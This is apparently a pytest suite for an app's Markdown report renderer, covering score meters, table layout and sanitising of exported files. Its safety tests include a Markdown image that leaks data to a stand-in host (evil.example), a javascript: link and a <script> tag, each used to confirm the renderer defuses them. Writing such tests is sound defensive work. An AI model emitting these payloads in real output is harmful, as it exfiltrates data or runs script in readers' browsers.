"""Report rendering to Markdown.

The exported file is the only artifact that leaves this app, so the sanitising and
the table integrity get the attention here. A newline inside a table cell ends the
row, which would silently mangle every score below it.
"""

import pytest

from app.agents.presets import primary_dimensions
from app.models.schemas import (
    ALL_DIMENSIONS,
    Deduction,
    DimensionScore,
    FeedbackReport,
    InterviewConfig,
    RewrittenAnswer,
)
from app.services.markdown_renderer import download_filename, render_markdown, score_meter


def _report(**overrides) -> FeedbackReport:
    fields = {
        "headline": "Strong framing, weak on measurement.",
        "scores": [
            DimensionScore(
                dimension=dimension,
                score=3,
                justification="held up under the probe",
                evidence="I would segment by listing count",
            )
            for dimension in ALL_DIMENSIONS
        ],
        "what_worked": ["named a specific segment"],
        "what_cost_points": [Deduction(moment="no metric", stronger_move="name a north star")],
        "rewritten_answer": RewrittenAnswer(
            question="How would you price it?",
            rewrite="Start from willingness to pay.",
            why_better="commits to a trade-off",
        ),
        "next_focus": "metrics: name a counter-metric every time",
    }
    fields.update(overrides)
    return FeedbackReport(**fields)


# --- the meter ----------------------------------------------------------------


@pytest.mark.parametrize(
    ("score", "expected"),
    [(1, "█░░░"), (2, "██░░"), (3, "███░"), (4, "████")],
)
def test_meter_has_one_segment_per_scale_point(score, expected):
    # Four segments because the scale has four points; a percentage bar would imply
    # a precision the rubric does not have.
    assert score_meter(score) == expected


@pytest.mark.parametrize("score", [0, 5, -3, 99])
def test_meter_clamps_out_of_range_scores(score):
    assert len(score_meter(score)) == 4


# --- structure ----------------------------------------------------------------


def test_exactly_one_top_level_heading():
    # So the file imports cleanly into editors that build a contents list from
    # heading levels.
    markdown = render_markdown(_report(), InterviewConfig())
    assert [line for line in markdown.splitlines() if line.startswith("# ")] == [
        "# Interview report"
    ]


def test_every_dimension_appears_with_its_score():
    from app.agents import rubric

    markdown = render_markdown(_report(), InterviewConfig())
    for dimension in ALL_DIMENSIONS:
        assert rubric.dimension(dimension).label in markdown


def test_primary_dimensions_lead_the_table():
    """A behavioural candidate must not see 'metrics' at the top of their report."""
    from app.agents import rubric

    for interview_type in ("execution_metrics", "behavioral", "strategy"):
        config = InterviewConfig(interview_type=interview_type)
        markdown = render_markdown(_report(), config)

        data_rows = [
            line for line in markdown.splitlines() if line.startswith("| ") and "/4" in line
        ]
        primary_labels = [rubric.dimension(key).label for key in primary_dimensions(interview_type)]

        leading = data_rows[: len(primary_labels)]
        for label, row in zip(primary_labels, leading, strict=True):
            assert label in row, f"{interview_type}: expected {label} in {row!r}"
        # And the primaries are marked as such.
        assert all("⌾" in row for row in leading)


def test_evidence_is_included():
    markdown = render_markdown(_report(), InterviewConfig())
    assert "I would segment by listing count" in markdown


def test_narrative_sections_are_present():
    markdown = render_markdown(_report(), InterviewConfig())

    for heading in ("## Scores", "## Evidence", "## What worked", "## What cost you points"):
        assert heading in markdown
    assert "## One answer, rewritten" in markdown
    assert "## Practise next" in markdown


def test_empty_optional_sections_are_omitted():
    markdown = render_markdown(_report(what_worked=[], what_cost_points=[]), InterviewConfig())

    assert "## What worked" not in markdown
    assert "## What cost you points" not in markdown


# --- safety -------------------------------------------------------------------


def test_multiline_field_cannot_break_a_table_row():
    """The failure this guards is silent: a newline in a cell ends the row."""
    report = _report(
        scores=[
            DimensionScore(
                dimension=dimension,
                score=2,
                justification="line one\nline two\n\nline three",
                evidence="quoted\nacross\nlines",
            )
            for dimension in ALL_DIMENSIONS
        ]
    )
    markdown = render_markdown(report, InterviewConfig())

    score_rows = [line for line in markdown.splitlines() if line.startswith("| ") and "/4" in line]
    assert len(score_rows) == len(ALL_DIMENSIONS)


def test_image_in_a_field_is_downgraded():
    # The exfiltration path: an image makes the reader's browser fetch a URL the
    # model chose, and the exported file is read outside this app.
    report = _report(headline="![leak](https://evil.example/?d=secret)")
    markdown = render_markdown(report, InterviewConfig())

    assert "![leak]" not in markdown
    assert "[image: leak]" in markdown


def test_script_link_in_evidence_is_defanged():
    report = _report(
        scores=[
            DimensionScore(
                dimension=dimension,
                score=1,
                justification="ok",
                evidence="[click](javascript:alert(1))",
            )
            for dimension in ALL_DIMENSIONS
        ]
    )
    markdown = render_markdown(report, InterviewConfig())
    assert "javascript:" not in markdown


def test_raw_html_is_escaped():
    report = _report(next_focus="<script>alert(1)</script>")
    markdown = render_markdown(report, InterviewConfig())
    assert "<script>" not in markdown


# --- filename -----------------------------------------------------------------


def test_filename_is_stable_and_safe():
    name = download_filename(
        InterviewConfig(interview_type="product_design", seniority="senior_pm")
    )

    assert name == "interview-report-product_design-senior_pm.md"
    assert "/" not in name and " " not in name
